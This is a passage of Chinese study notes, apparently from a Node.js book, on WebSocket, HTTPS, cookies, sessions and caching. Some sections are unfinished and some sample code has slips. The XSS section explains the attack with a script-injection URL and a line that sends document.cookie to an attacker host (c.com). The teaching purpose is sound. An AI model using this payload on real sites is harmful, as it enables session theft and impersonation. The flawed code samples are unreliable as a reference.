</code></pre></div><h3 id="_7-4-构建websocket服务"><a href="#_7-4-构建websocket服务" class="header-anchor">#</a> 7.4 构建WebSocket服务</h3> <p>相比HTTP，WebSocket更接近于传输层协议，它并没有在HTTP的基础上模拟服务器端的发送，而是在TCP上定义独立的协议，让人迷路的部分在于WebSocket的握手部分是由HTTP完成的，使人可能觉得它可能是基于HTTP实现的。</p> <h4 id="_7-4-1-websocket握手"><a href="#_7-4-1-websocket握手" class="header-anchor">#</a> 7.4.1 WebSocket握手</h4> <p>请求报文</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">GET</span> <span class="token operator">/</span>chat <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token operator">:</span> xxx<span class="token punctuation">.</span>com
<span class="token comment">// 请求服务升级协议为WebSocket</span>
Upgrade<span class="token operator">:</span> websocket
Connection<span class="token operator">:</span> Upgrade
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Key<span class="token operator">:</span> dGhlIHn<span class="token operator">...</span>  <span class="token comment">// 安全校验</span>
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Prototal<span class="token operator">:</span> chat<span class="token punctuation">,</span> superchat  <span class="token comment">// 子协议</span>
Sec<span class="token operator">-</span>Websocket<span class="token operator">-</span>Version<span class="token operator">:</span> <span class="token number">13</span>  <span class="token comment">// 版本号</span>
</code></pre></div><p>响应报文</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">101</span> Switching Protocols
<span class="token comment">// 更新应用层协议为WebSocket协议</span>
Upgrade<span class="token operator">:</span> websocket
Connection<span class="token operator">:</span> Upgrade
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Accept<span class="token operator">:</span> s3pPl<span class="token operator">...</span>
Sec<span class="token operator">-</span>WebSocket<span class="token operator">-</span>Prototal<span class="token operator">:</span> chat
</code></pre></div><p>node代码部分 // Todo</p> <h4 id="_7-4-2-websocket数据传输"><a href="#_7-4-2-websocket数据传输" class="header-anchor">#</a> 7.4.2 WebSocket数据传输</h4> <p>在握手顺利完成后，当前连接不再进行HTTP的交互，而是开始WebSocket的数据帧协议，实现客户端与服务器端的数据交换，握手完成后，客户端的onopen()将会被触发执行，代码如下：</p> <div class="language-js extra-class"><pre class="language-js"><code>socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 要做的事情</span>
<span class="token punctuation">}</span>
</code></pre></div><p>服务器端。 // Todo</p> <h3 id="_7-5-网络服务与安全"><a href="#_7-5-网络服务与安全" class="header-anchor">#</a> 7.5 网络服务与安全</h3> <p>为防止数据被监听，我们需要将数据加密后再进行网络传输，但是对于应用层而言，如HTTP，FTP等，我们仍希望能够透明的处理数据，而无需操心网络传输过程中的安全问题。<br>
SSL Secure Sockets Layer，安全嵌套层，SSL作为一种安全协议，它在传输层提供对网络连接加密的功能。对于应用层而言，它是透明的，数据在传递到应用层之前就已经完成了加密和解密的过程。最初的SSL应用在Web上，被放服务器端和浏览器端同时支持，对吼IEIF将其标准化，成为TLS(Transport Layer Security, 安全传输层协议)<br>
Node在网络安全上提供了3个模块，分别为crypto, tls, https.其中crypto主要用于加密解密，SHAI,MD5等加密算法都在其中有体现，真正用于网络的是另外两个模块，tls模块提供了与net模块类似的功能，区别在于它建立在TLS/SSL加密的TCP连接上，对于https而言，它完全与http模块接口一致，区别也仅在于它建立安全的连接之上。</p> <h4 id="_7-5-1-tls-ssl"><a href="#_7-5-1-tls-ssl" class="header-anchor">#</a> 7.5.1 TLS/SSL</h4> <ol><li>秘钥
TLS/SSL是一种公钥/私钥的结构，它是一个非对称结构，每个服务器端和客户端都有自己的公私钥，公钥用来加密要传输的数据，私钥用来解密接收收到的数据
// Todo</li> <li>数字证书
// Todo Todo</li></ol> <h4 id="_7-5-2-tls服务"><a href="#_7-5-2-tls服务" class="header-anchor">#</a> 7.5.2 TLS服务</h4> <p>利用tls模块，在创建server的时候需要传入一个options的对象参数，其中包含CA证书</p> <h4 id="_7-5-3-https服务"><a href="#_7-5-3-https服务" class="header-anchor">#</a> 7.5.3 HTTPS服务</h4> <p>HTTPS服务就是工作在TLS/SSL上的HTTP<br>
创建HTTPS服务</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> https <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'https'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>
  key<span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./keys/server.key'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  cert<span class="token operator">:</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./keys/server.crt'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span>options<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>
</code></pre></div><p>HTTPS客户端，也需要指定证书的相关参数 // Todo</p> <h3 id="_7-6-总结"><a href="#_7-6-总结" class="header-anchor">#</a> 7.6 总结</h3> <p>Node基于事件驱动和非阻塞设计，在分布式环境中尤其能发挥出它的特长，基于事件驱动可以实现与大量的客户端进行对接，非阻塞设计则可以让它更好的提升网络的响应吞吐，Node提供了相对底层的网络调用，以及基于事件的编程接口，使得开发者在这些模块上十分轻松的构建网络应用</p> <h2 id="第八章-构建web应用"><a href="#第八章-构建web应用" class="header-anchor">#</a> 第八章 构建Web应用</h2> <h3 id="_8-1-基础功能"><a href="#_8-1-基础功能" class="header-anchor">#</a> 8.1 基础功能</h3> <p>本章Web应用方面的内容，将从http模块中的服务器端的request事件开始分析。request事件发生于网络连接建立，客户端向服务端发送报文，服务端解析报文，发现HTTP请求的报头时，在已触发request事件前，它已准备好ServerRequest和ServerResponse对象以供对请求和响应报文的操作，比如，官方的一个简单示例，就是调用ServerResponse实现响应的。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>
http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'Hello World'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">,</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'服务启动啦~'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求，在具体的业务中，我们可能会有如下这些需求。</p> <ul><li>请求方法的判断</li> <li>URL的路径解析</li> <li>URL中查询字符串解析</li> <li>Cookie的解析</li> <li>认证</li> <li>表单数据的解析</li> <li>任意格式文件的上传处理</li></ul> <h4 id="_8-1-1-请求方法"><a href="#_8-1-1-请求方法" class="header-anchor">#</a> 8.1.1 请求方法</h4> <p>除了最常见的GET, POST之外，还有HEAD, DELETE, PUT, CONNECT等方法。通常，我们只需要处理GET, POST两类请求方法，但是在Restful类web服务中心请求方法十分重要，因为它会决定资源的操作行为。PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELETE表示删除一个资源。我们可以通过请求方法来决定响应行为，如</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">switch</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token operator">:</span>
      <span class="token function">update</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
    <span class="token keyword">case</span> <span class="token string">'DELETE'</span><span class="token operator">:</span>
      <span class="token function">remove</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
    <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token operator">:</span>
      <span class="token function">create</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token keyword">break</span>
    <span class="token keyword">case</span> <span class="token string">'GET'</span><span class="token operator">:</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h4 id="_8-1-2-路径解析"><a href="#_8-1-2-路径解析" class="header-anchor">#</a> 8.1.2 路径解析</h4> <p>HTTP_Parser将其解析为req.url, hash部分会被丢掉<br>
一种比较常见的是根据路径进行业务处理的应用是静态文件服务器，还有一种是根据路径来选择控制器</p> <h4 id="_8-1-3-查询字符串"><a href="#_8-1-3-查询字符串" class="header-anchor">#</a> 8.1.3 查询字符串</h4> <p>在地址栏路径后的<code>?foo=bar&amp;baz=val</code>可以使用node核心模块querystring，<code>querystring.parse(req.url.split(?)[1])</code>, 当然更简洁的方法是使用引入核心模块url,<code>url.parse(req.url,true).query</code></p> <h4 id="_8-1-4-cookie"><a href="#_8-1-4-cookie" class="header-anchor">#</a> 8.1.4 Cookie</h4> <p>HTTP是无状态的，现实中的应用却需要一定的状态，如何标识和认证一个用户，最早的方案就是Cookie了</p> <p>Cookie的处理分为如下几步：</p> <ul><li>服务端向客户端发送Cookie</li> <li>浏览器将Cookie保存</li> <li>之后每次浏览器都会将Cookie发送服务器端</li></ul> <p>命令行模拟发送cookie <code>curl -v -H &quot;Cookie: foo=bar; baz=val&quot; &quot;http://127.0.0.1:1337/path?foo=bar&amp;baz=val&quot;</code></p> <p>获取cookie<code>req.headers.cookie</code>，cookie是字符串如<code>Cookie: foo=bar; baz=val</code>的方式，可以写一个函数进行解析，如下</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">parseCookie</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> cookies
  <span class="token punctuation">}</span>
  <span class="token keyword">var</span> list <span class="token operator">=</span> cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span>list<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> pair <span class="token operator">=</span> list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
    cookies<span class="token punctuation">[</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> cookies
<span class="token punctuation">}</span>
</code></pre></div><p>响应字段在Set-Cookie里面，例如<code>Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=domian.com</code>,主要选项</p> <ul><li>path，表示cookie影响到的路径</li> <li>Expires和Max-Age告知浏览器何时过期</li> <li>HttpOnly，告知浏览器不可以通过脚本<code>document.cookie</code>去更改cookie值</li> <li>Secure: 当设置为true只有在HTTPS中才有效</li></ul> <p>Cookie的性能问题：cookie在发送每次请求都会被带到服务端，优化：</p> <ul><li>减小cookie大小</li> <li>为静态资源使用不同的域名</li> <li>减少DNS查询？</li></ul> <h4 id="_8-1-5-session"><a href="#_8-1-5-session" class="header-anchor">#</a> 8.1.5 Session</h4> <p>通过Cookie，浏览器和服务器可以实现状态的记录，但是Cookie并非是完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是Cookie可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务端有部分逻辑是根据Cookie中的isVIP字段进行判断，那么一个普通用户通过修改Cookie就可以轻松享受到VIP服务了，综上所述，Cookie对于敏感数据的保护是无效的。</p> <p>为了解决Cookie敏感数据的问题，Session应运而生。Session的数据值保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。</p> <p>虽然在服务端存储数据十分方便，但是如何将每个客户和服务器中的数据一一对应起来，这里有常见的两种实现方式。</p> <ol><li>基于Cookie来实现用户和数据的映射
将口令放在Cookie里面，口令如何产生？一般服务器端会约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，一旦服务器检查到用户请求Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重读的值，并设置超时时间。以下为生成session的代码：</li></ol> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> sessions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session_id'</span>
<span class="token keyword">var</span> <span class="token constant">EXPIRES</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">1000</span>

<span class="token keyword">var</span> <span class="token function-variable function">generate</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  session<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  session<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token punctuation">{</span>
    expire<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token constant">EXPIRES</span>
  <span class="token punctuation">}</span>
  sessions<span class="token punctuation">[</span>session<span class="token punctuation">.</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> session
  <span class="token keyword">return</span> session
<span class="token punctuation">}</span>
</code></pre></div><p>每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成，如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> id <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    req<span class="token punctuation">.</span>session <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> session <span class="token operator">=</span> sessions<span class="token punctuation">[</span>id<span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>session<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span>expire <span class="token operator">&gt;</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 更新超时时间</span>
        session<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span>expire <span class="token operator">=</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token constant">EXPIRES</span>
        req<span class="token punctuation">.</span>session <span class="token operator">=</span> session
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// 超时了，删除旧的数据，并重新生成</span>
        <span class="token keyword">delete</span> sessions<span class="token punctuation">[</span>id<span class="token punctuation">]</span>
        req<span class="token punctuation">.</span>session <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token comment">// 如果session过期或者口令不对，重新生成Session</span>
      req<span class="token punctuation">.</span>session <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p>当然仅仅重新生成Session还不足以完成整个流程，还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据，这里我们hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑，如下：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> writeHead <span class="token operator">=</span> res<span class="token punctuation">.</span>writeHead
res<span class="token punctuation">.</span><span class="token function-variable function">writeHead</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> cookies <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">)</span>
  <span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id<span class="token punctuation">)</span>
  cookie <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span> <span class="token operator">?</span> cookies<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span>cookies<span class="token punctuation">,</span> session<span class="token punctuation">]</span>
  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'Set-Header'</span><span class="token punctuation">,</span> cookies<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token function">writeHead</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p>至此，session在前后端进行对应的过程就完成了，这样的业务路基可以判断和设置session，以此来维护用户和服务器端的关系，如下所示：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">handle</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVisit<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isVisit <span class="token operator">=</span> <span class="token boolean">true</span>
    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'欢迎第一次来到动物园'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'动物园再次欢迎你！'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><ol start="2"><li>第二种：通过查询字符串来实现浏览器端和服务器端数据的对应</li></ol> <p>在上面的示例代码中，我们都将Session数据直接存在了变量sessions中，它位于内存中，然而在第五章的内存控制部分，我们分析了为什么Node会存在内存限制，这里将数据存放在内存中将会带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会因此垃圾回收的频繁扫描，引起性能问题。<br>
另一个问题则是我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的Session可能会有引起错乱。</p> <p>为了解决性能问题和Session数据无法跨进程共享的问题，常见的方案是将session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中，目前常用的工具是Redis、Memcached等。通过这些高效地缓存，Node进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理高效，比在Node中自行设计缓存策略更好。</p> <p>尽管采用专门的缓存服务回避直接在内存中访问慢，但其影响小之又小，带来的好处远远大于直接在Node中存储数据。</p> <p>Session安全：通过私钥加密进行签名</p> <h5 id="安全问题"><a href="#安全问题" class="header-anchor">#</a> 安全问题</h5> <p>XSS漏洞<br>
全称Cross-Site Scripting 跨站脚本攻击。XSS漏洞会让本地脚本执行，它的形成原因多数是用户的输入没有被转义，而被直接执行，比如某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><p>攻击者在发现这里的漏洞之后，构造成了这样的URL</p> <div class="language-js extra-class"><pre class="language-js"><code>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>a<span class="token punctuation">.</span>com<span class="token operator">/</span>pathname#<span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;http://b.com/c.js&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre></div><p>为了不让受害者发现这端URL中的猫腻，它可能会通过URL压缩成一个短网址，如下</p> <div class="language-js extra-class"><pre class="language-js"><code>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>t<span class="token punctuation">.</span>cn<span class="token operator">/</span>fasdfj
<span class="token comment">// 或者再次压缩</span>
http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>url<span class="token punctuation">.</span>cn<span class="token operator">/</span>fasdfb
</code></pre></div><p>然后将最终的短网址发给某个登录的在线用户，这样一来。这端hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下：</p> <div class="language-js extra-class"><pre class="language-js"><code>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'http://c.com/?'</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie
</code></pre></div><p>这段代码将该用户的Cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令，然后他在客户端那种用这个口令伪造Cookie，从而实现了伪装用户的身份，如果该用户是网站管理员，就可能造成极大的危害</p> <h4 id="_8-1-6-缓存"><a href="#_8-1-6-缓存" class="header-anchor">#</a> 8.1.6 缓存</h4> <p>通常来说，POST, DELETE, PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存值应用在GET请求中。一般可以通过添加<code>Expires Cache-Control Etags</code>来实现缓存</p> <table><thead><tr><th>服务端</th> <th>客户端</th></tr></thead> <tbody><tr><td>Last-Modefied</td> <td>If-Modefied-Since</td></tr> <tr><td>Etag</td> <td>If-None-Match</td></tr></tbody></table> <h4 id="_8-1-7-basic认证"><a href="#_8-1-7-basic认证" class="header-anchor">#</a> 8.1.7 Basic认证</h4> <p>Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式，这里简要介绍它的原理和它在服务端通过Node处理的流程。<br>
如果一个页面需要Basic认证，它会检查请求报文中的Authrization字段的内容，该字段的值由认证方式和加密值构成...<br>
不过Basic认证有很多缺点。</p> <h3 id="_8-2-数据上传"><a href="#_8-2-数据上传" class="header-anchor">#</a> 8.2 数据上传</h3> <p>上述的内容基本都集中在HTTP请求报文头中，适用于GET请求和大多数其他请求。头部报文中的内容已经能够让服务器端进行大多数业务逻辑操作了，但是单纯的头部报文无法携带大量的数据，在业务中，我们往往需要接收一些数据，比如表单提交，文件提交，JSON上传，XML上传等。</p> <p>Node的http模块支队HTTP报文的头部进行了解析，然后出发request事件，如果请求中海油内容部分(如POST请求，它具有请求和内容)，内容部分需要用户自行接收和解析，通过报头的<code>Transfer-Encoding</code>或<code>Content-Length</code>即可判断请求是否带有内容。如下:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">hasBody</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">transfer-encoding</span><span class="token template-punctuation string">`</span></span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>headers <span class="token operator">||</span> <span class="token string">'content-length'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>headers
<span class="token punctuation">}</span>
</code></pre></div><p>在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发，我们只需以流的方式处理即可，如下所示:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hasBody</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> buffers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      buffers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span>
